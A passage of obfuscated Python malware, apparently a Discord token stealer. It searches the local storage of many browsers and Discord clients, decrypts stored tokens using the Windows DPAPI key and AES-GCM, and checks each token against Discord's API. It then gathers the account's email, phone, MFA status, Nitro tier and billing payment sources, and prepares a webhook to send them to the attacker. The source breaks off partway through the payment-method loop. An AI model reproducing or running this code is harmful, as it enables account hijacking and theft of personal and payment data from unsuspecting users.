            'Orbitum': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO, WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV in OBWZDOMZUEOWFLCMCGVJLTTXSJTFIKYUNZLYTHLZBERMSHRPBUNFAZJATQAWGKMUHQRSLJMYO.items():
            if not os.path.exists(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV):
                continue
            LXQIEJTZEYRUJRFGGKZAFSZQJVYABUEIXLHXZVAFNASJTNCBEHGEPOIVWYKFDTLRCHLC = XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO.replace(" ", "").lower()
            if "cord" in WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV:
                if not os.path.exists(LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + f'\\{LXQIEJTZEYRUJRFGGKZAFSZQJVYABUEIXLHXZVAFNASJTNCBEHGEPOIVWYKFDTLRCHLC}\\Local State'):
                    continue
                for v4r_file_name in os.listdir(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(LSSXNWGSBPAQWURSQNXACMUSMHXKYXJSUKPQHJZJTLXDHQSWJZWZWHIGWTTROMCQXZUELXRPUSBFZJKOTMDNLQTPEKV_enc, v4r_line.strip()):
                                VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ = ATAFEBVCMRWRXHGLMGQKGTQJBVSPMNFMRTQHMLCMROCQHFZVQKQVURSBJJUXWVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), QSINRRTCOGNGDFKQLXUORAMBVXWPLFZJCIJMONFGHYKDFWSMCQTYXOJOLKSIPOOHPOLXPWMLLXHPNDCHVBABAUY(LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + f'\\{LXQIEJTZEYRUJRFGGKZAFSZQJVYABUEIXLHXZVAFNASJTNCBEHGEPOIVWYKFDTLRCHLC}\\Local State'))
                                if SXYMFDPSAHKUSTAVAANBILNZMILFFJWMJZZWXJJWJYUGBIMUNJVQLKTTTMMR(VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ, CVYQTXTGPEUCAPOHMITIPJXECIRUGOEMITSQJHODRRYUPXBTQKVHYXIAMMCINSWGQAZWPSXL):
                                    DVSFWDKLLRBRJFFNYGOVASJWPWWNPLWPXYHYSTKERFAFAUQBJQVXEMZNSCVVDZMEMOSMLBPPHQJNSICYYREITQEGTAKJJDMPLCIC = requests.get(CVYQTXTGPEUCAPOHMITIPJXECIRUGOEMITSQJHODRRYUPXBTQKVHYXIAMMCINSWGQAZWPSXL, headers={'Authorization': VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ}).json()['id']
                                    if DVSFWDKLLRBRJFFNYGOVASJWPWWNPLWPXYHYSTKERFAFAUQBJQVXEMZNSCVVDZMEMOSMLBPPHQJNSICYYREITQEGTAKJJDMPLCIC not in FAUDQUUOQCUUJNDSPOTQQFUFHJHSRQBMOUDLWBPRJZFHAIAPIBRLZGQVQAOZKLIRZIJCEOQXBWOZQIOSTSVPGPABQTUWUXZVRMQ:
                                        FCPOSSNSUHYBKAOPHZMCIAXQRPEOZJBUZVNKYTKTEBPLMSREHBBUBUMGUUMWWCVZSKEDEXGKDUPXGWSLGOUR.append(VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ)
                                        FAUDQUUOQCUUJNDSPOTQQFUFHJHSRQBMOUDLWBPRJZFHAIAPIBRLZGQVQAOZKLIRZIJCEOQXBWOZQIOSTSVPGPABQTUWUXZVRMQ.append(DVSFWDKLLRBRJFFNYGOVASJWPWWNPLWPXYHYSTKERFAFAUQBJQVXEMZNSCVVDZMEMOSMLBPPHQJNSICYYREITQEGTAKJJDMPLCIC)
                                        JGPHUNTHYTJRWRCMGQNGPGFZOQQHNXVSAOPBIRBUASJJBQVGPWYIGMBPXSCMGF[VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ] = (XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO, f"{WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV}\\{v4r_file_name}")
            else:
                for v4r_file_name in os.listdir(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ in re.findall(LSSXNWGSBPAQWURSQNXACMUSMHXKYXJSUKPQHJZJTLXDHQSWJZWZWHIGWTTROMCQXZUELXRPUSBFZJKOTMDNLQTPEKV, v4r_line.strip()):
                                if SXYMFDPSAHKUSTAVAANBILNZMILFFJWMJZZWXJJWJYUGBIMUNJVQLKTTTMMR(VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ, CVYQTXTGPEUCAPOHMITIPJXECIRUGOEMITSQJHODRRYUPXBTQKVHYXIAMMCINSWGQAZWPSXL):
                                    DVSFWDKLLRBRJFFNYGOVASJWPWWNPLWPXYHYSTKERFAFAUQBJQVXEMZNSCVVDZMEMOSMLBPPHQJNSICYYREITQEGTAKJJDMPLCIC = requests.get(CVYQTXTGPEUCAPOHMITIPJXECIRUGOEMITSQJHODRRYUPXBTQKVHYXIAMMCINSWGQAZWPSXL, headers={'Authorization': VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ}).json()['id']
                                    if DVSFWDKLLRBRJFFNYGOVASJWPWWNPLWPXYHYSTKERFAFAUQBJQVXEMZNSCVVDZMEMOSMLBPPHQJNSICYYREITQEGTAKJJDMPLCIC not in FAUDQUUOQCUUJNDSPOTQQFUFHJHSRQBMOUDLWBPRJZFHAIAPIBRLZGQVQAOZKLIRZIJCEOQXBWOZQIOSTSVPGPABQTUWUXZVRMQ:
                                        FCPOSSNSUHYBKAOPHZMCIAXQRPEOZJBUZVNKYTKTEBPLMSREHBBUBUMGUUMWWCVZSKEDEXGKDUPXGWSLGOUR.append(VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ)
                                        FAUDQUUOQCUUJNDSPOTQQFUFHJHSRQBMOUDLWBPRJZFHAIAPIBRLZGQVQAOZKLIRZIJCEOQXBWOZQIOSTSVPGPABQTUWUXZVRMQ.append(DVSFWDKLLRBRJFFNYGOVASJWPWWNPLWPXYHYSTKERFAFAUQBJQVXEMZNSCVVDZMEMOSMLBPPHQJNSICYYREITQEGTAKJJDMPLCIC)
                                        JGPHUNTHYTJRWRCMGQNGPGFZOQQHNXVSAOPBIRBUASJJBQVGPWYIGMBPXSCMGF[VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ] = (XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO, f"{WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV}\\{v4r_file_name}")

        if os.path.exists(LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + "\\Mozilla\\Firefox\\Profiles"):
            for WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV, _, v4r_files in os.walk(LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + "\\Mozilla\\Firefox\\Profiles"):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(f'{WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV}\\{v4r__file}', errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ in re.findall(LSSXNWGSBPAQWURSQNXACMUSMHXKYXJSUKPQHJZJTLXDHQSWJZWZWHIGWTTROMCQXZUELXRPUSBFZJKOTMDNLQTPEKV, v4r_line.strip()):
                                    if SXYMFDPSAHKUSTAVAANBILNZMILFFJWMJZZWXJJWJYUGBIMUNJVQLKTTTMMR(VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ, CVYQTXTGPEUCAPOHMITIPJXECIRUGOEMITSQJHODRRYUPXBTQKVHYXIAMMCINSWGQAZWPSXL):
                                        DVSFWDKLLRBRJFFNYGOVASJWPWWNPLWPXYHYSTKERFAFAUQBJQVXEMZNSCVVDZMEMOSMLBPPHQJNSICYYREITQEGTAKJJDMPLCIC = requests.get(CVYQTXTGPEUCAPOHMITIPJXECIRUGOEMITSQJHODRRYUPXBTQKVHYXIAMMCINSWGQAZWPSXL, headers={'Authorization': VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ}).json()['id']
                                        if DVSFWDKLLRBRJFFNYGOVASJWPWWNPLWPXYHYSTKERFAFAUQBJQVXEMZNSCVVDZMEMOSMLBPPHQJNSICYYREITQEGTAKJJDMPLCIC not in FAUDQUUOQCUUJNDSPOTQQFUFHJHSRQBMOUDLWBPRJZFHAIAPIBRLZGQVQAOZKLIRZIJCEOQXBWOZQIOSTSVPGPABQTUWUXZVRMQ:
                                            FCPOSSNSUHYBKAOPHZMCIAXQRPEOZJBUZVNKYTKTEBPLMSREHBBUBUMGUUMWWCVZSKEDEXGKDUPXGWSLGOUR.append(VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ)
                                            FAUDQUUOQCUUJNDSPOTQQFUFHJHSRQBMOUDLWBPRJZFHAIAPIBRLZGQVQAOZKLIRZIJCEOQXBWOZQIOSTSVPGPABQTUWUXZVRMQ.append(DVSFWDKLLRBRJFFNYGOVASJWPWWNPLWPXYHYSTKERFAFAUQBJQVXEMZNSCVVDZMEMOSMLBPPHQJNSICYYREITQEGTAKJJDMPLCIC)
                                            JGPHUNTHYTJRWRCMGQNGPGFZOQQHNXVSAOPBIRBUASJJBQVGPWYIGMBPXSCMGF[VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ] = ('Firefox', f"{WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV}\\{v4r__file}")
        return FCPOSSNSUHYBKAOPHZMCIAXQRPEOZJBUZVNKYTKTEBPLMSREHBBUBUMGUUMWWCVZSKEDEXGKDUPXGWSLGOUR, JGPHUNTHYTJRWRCMGQNGPGFZOQQHNXVSAOPBIRBUASJJBQVGPWYIGMBPXSCMGF

    def SXYMFDPSAHKUSTAVAANBILNZMILFFJWMJZZWXJJWJYUGBIMUNJVQLKTTTMMR(VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ, CVYQTXTGPEUCAPOHMITIPJXECIRUGOEMITSQJHODRRYUPXBTQKVHYXIAMMCINSWGQAZWPSXL):
        return requests.get(CVYQTXTGPEUCAPOHMITIPJXECIRUGOEMITSQJHODRRYUPXBTQKVHYXIAMMCINSWGQAZWPSXL, headers={'Authorization': VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ}).status_code == 200

    def ATAFEBVCMRWRXHGLMGQKGTQJBVSPMNFMRTQHMLCMROCQHFZVQKQVURSBJJUXWVal(WQUOFUMAXFCBJDANRTIQXNIVKRONOIZPTFXTXGLKODQALDQWTLMQNNQOUKMTCKNHQHLKJNRG, BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH):
        SGQGYVDHQFKMYRHVRPAFLYODXCYYHMXNLRSOCYOXJADSUNFRNEHIHWQBVRRAH = WQUOFUMAXFCBJDANRTIQXNIVKRONOIZPTFXTXGLKODQALDQWTLMQNNQOUKMTCKNHQHLKJNRG[3:15]
        QWYSUDPVGYSPBKIJTSIPFAATLTXLZYMBIQEZZSZVAAUPYVOBYCUKFEL = WQUOFUMAXFCBJDANRTIQXNIVKRONOIZPTFXTXGLKODQALDQWTLMQNNQOUKMTCKNHQHLKJNRG[15:]
        DWMBNKLHVSFROPXDCQPIBUCWDOZVQHPKWTTGMCESZSGVCEYGEFHAXSKMJBZOZSRHAKCGDGEGOTPXLMKNBRJXE = AES.new(BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH, AES.MODE_GCM, SGQGYVDHQFKMYRHVRPAFLYODXCYYHMXNLRSOCYOXJADSUNFRNEHIHWQBVRRAH)
        return DWMBNKLHVSFROPXDCQPIBUCWDOZVQHPKWTTGMCESZSGVCEYGEFHAXSKMJBZOZSRHAKCGDGEGOTPXLMKNBRJXE.decrypt(QWYSUDPVGYSPBKIJTSIPFAATLTXLZYMBIQEZZSZVAAUPYVOBYCUKFEL)[:-16].decode()

    def QSINRRTCOGNGDFKQLXUORAMBVXWPLFZJCIJMONFGHYKDFWSMCQTYXOJOLKSIPOOHPOLXPWMLLXHPNDCHVBABAUY(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV):
        if not os.path.exists(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV):
            return None
        with open(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV, "r", encoding="utf-8") as v4r_f:
            IBHDBICBSOVMSOZDGKKVJPPKNHKTXZLIKJSPMRJUWEIQVBNXHNPIL = json.load(v4r_f)
        BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH = base64.b64decode(IBHDBICBSOVMSOZDGKKVJPPKNHKTXZLIKJSPMRJUWEIQVBNXHNPIL["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH, None, None, None, 0)[1]

    FCPOSSNSUHYBKAOPHZMCIAXQRPEOZJBUZVNKYTKTEBPLMSREHBBUBUMGUUMWWCVZSKEDEXGKDUPXGWSLGOUR, JGPHUNTHYTJRWRCMGQNGPGFZOQQHNXVSAOPBIRBUASJJBQVGPWYIGMBPXSCMGF = LYAYYTZPHNBCSDSQQNGSWYYLRJRRSNDBPOCMDFXFNQTYRQOKOJBDBPTMOONEZHRHQAAEHMOTLXIGNHOINXMNMCJZWNVVOE()
    HSHXQNITDRHLJNZNYMKACGRQNYRFAPVTPTMPVZACEVGUNHWANHZWIZEXCIXLHELZGZLFH = SyncWebhook.from_url(LQUXQACAYSISJCBUBHOCHNJJAERPJNEEXFPEBBGVUSBFKJRWOXLWIEDBADMCTGAXLXHRRZOEWUBIP)

    if not FCPOSSNSUHYBKAOPHZMCIAXQRPEOZJBUZVNKYTKTEBPLMSREHBBUBUMGUUMWWCVZSKEDEXGKDUPXGWSLGOUR:
        ICTDOCTAFYXWMGJTVPSRSFGVGWYQQYSSACVCWEUCMAAYUXLPRBLUBUYKADSELFMLBRGDTRSTYAXKPSENPVN(
            LQUXQACAYSISJCBUBHOCHNJJAERPJNEEXFPEBBGVUSBFKJRWOXLWIEDBADMCTGAXLXHRRZOEWUBIP, 
            title=f'Discord Token {MZVIGMGXUVAXUKCLGKDNXBUIHWTQLFHVFWRIZZGPSASITDFHPUFXJWINONFJZITXFJNMJPAXGTMNBZCNGCCLBJR}:', 
            description=f"No discord tokens found."
        )
        return
    
    for VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ_d15c0rd in FCPOSSNSUHYBKAOPHZMCIAXQRPEOZJBUZVNKYTKTEBPLMSREHBBUBUMGUUMWWCVZSKEDEXGKDUPXGWSLGOUR:
        RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ_d15c0rd}).json()

        OVJSIMZEIWYASFKIYLCZNXYOESPPUBIUTFNSUICPPKIWTTUZTEGIUJXJELAIGCNSGFQLFVVZUGCQZDIAFSACRCXRHRVRX = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('username', "None") + '#' + RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('discriminator', "None")
        UGTBXDSYZOOWGWWNVSSUSZXUTCIQHSHIWKXWMUECQIWKFMOJYNOXPUMGXCBHWWZYDBATHGAFLQPXXDAGI = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('global_name', "None")
        SZHTTZJDTMFLXYEONGGKXNHXLAEWFWWSUKNZIWZSQOBPXWHGUCJPEEBUJTBIMCZEEGHOGNFZGNMVNNBNTRVMEQHYWSY = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('id', "None")
        PFBAZAVXZOHIHOZFXPJTIQYXRPMAWFOLQZBVCSLQDSKTXAOPEMDEJNTYIUSVJRKUHRRCWZIXXM = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('email', "None")
        NGVQNQFPHGZRTUNHNMEQXJQINCHUYIVSEQSANEPFEOWTLJWMWKERROCLUIGHBIWGPYQJIFQXZWXKGGWBDCWTXUDYBCZTTIG = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('verified', "None")
        HIDYCKPOPAHCNZEUJZSTQIYSPWYWVQESNVCOTBRCFIEJQCDGAKUEATCZGZQOBLTYAMJDTXKXLMI = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('phone', "None")
        GLVBTMTWFUBQWCCLMMXBLDDRQHBAODKWJBELVARKUQIUNEWLXGLJTKPKIQJRFATLPWKSGVLVYYSOSSPDJQAZGNVKXR = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('locale', "None")
        NYLAMFXOIEPFHCZJAFXXZXONGVNEHWNSPKIWSLNPYWIWQRZNPLJRSUNBVVOWMNDSNNYE = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('mfa_enabled', "None")

        try:
            if RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('premium_type', 'None') == 0:
                IYPGWIEVGRGPKPTYEFGSINUTLJHSYRRGZOOUOAWJSQKPBLBVMPIZSMGGKCXAGQPEVBYKGZARFMXUYFFDDHOTZIABXCPXV = 'False'
            elif RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('premium_type', 'None') == 1:
                IYPGWIEVGRGPKPTYEFGSINUTLJHSYRRGZOOUOAWJSQKPBLBVMPIZSMGGKCXAGQPEVBYKGZARFMXUYFFDDHOTZIABXCPXV = 'Nitro Classic'
            elif RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('premium_type', 'None') == 2:
                IYPGWIEVGRGPKPTYEFGSINUTLJHSYRRGZOOUOAWJSQKPBLBVMPIZSMGGKCXAGQPEVBYKGZARFMXUYFFDDHOTZIABXCPXV = 'Nitro Boosts'
            elif RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('premium_type', 'None') == 3:
                IYPGWIEVGRGPKPTYEFGSINUTLJHSYRRGZOOUOAWJSQKPBLBVMPIZSMGGKCXAGQPEVBYKGZARFMXUYFFDDHOTZIABXCPXV = 'Nitro Basic'
            else:
                IYPGWIEVGRGPKPTYEFGSINUTLJHSYRRGZOOUOAWJSQKPBLBVMPIZSMGGKCXAGQPEVBYKGZARFMXUYFFDDHOTZIABXCPXV = 'False'
        except:
            IYPGWIEVGRGPKPTYEFGSINUTLJHSYRRGZOOUOAWJSQKPBLBVMPIZSMGGKCXAGQPEVBYKGZARFMXUYFFDDHOTZIABXCPXV = "None"

        try: 
            VTZYABPIGLEMSZNKMCECPGRIAXMCGPGMATZKJKNJOVARIEUDKTQSUYSVHSKEHTFUZNJOWQZCFAFDIHFZCRRVVDRAW = f"https://cdn.discordapp.com/avatars/{SZHTTZJDTMFLXYEONGGKXNHXLAEWFWWSUKNZIWZSQOBPXWHGUCJPEEBUJTBIMCZEEGHOGNFZGNMVNNBNTRVMEQHYWSY}/{RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{SZHTTZJDTMFLXYEONGGKXNHXLAEWFWWSUKNZIWZSQOBPXWHGUCJPEEBUJTBIMCZEEGHOGNFZGNMVNNBNTRVMEQHYWSY}/{RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{SZHTTZJDTMFLXYEONGGKXNHXLAEWFWWSUKNZIWZSQOBPXWHGUCJPEEBUJTBIMCZEEGHOGNFZGNMVNNBNTRVMEQHYWSY}/{RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL['avatar']}.png"
        except: 
            VTZYABPIGLEMSZNKMCECPGRIAXMCGPGMATZKJKNJOVARIEUDKTQSUYSVHSKEHTFUZNJOWQZCFAFDIHFZCRRVVDRAW = KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV

        try:
            URKIHBPZPWTDHQVWNDVVUKJBAHDVENDNSYBWYMOEMOSYMOWUCPIQGPRWICWGJOGPRPMIHQHLMCWGQMTKVPVFWLTLKKLGMPGUI = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ_d15c0rd}).json()
            if URKIHBPZPWTDHQVWNDVVUKJBAHDVENDNSYBWYMOEMOSYMOWUCPIQGPRWICWGJOGPRPMIHQHLMCWGQMTKVPVFWLTLKKLGMPGUI:
                TSZAMDSFDCGGCLADLHWCSUJJOBAAMMDYGXKGLZGLVRIAAHXWWFQLTTEZWAXTEVVLWQUCY = []

                for v4r_method in URKIHBPZPWTDHQVWNDVVUKJBAHDVENDNSYBWYMOEMOSYMOWUCPIQGPRWICWGJOGPRPMIHQHLMCWGQMTKVPVFWLTLKKLGMPGUI:
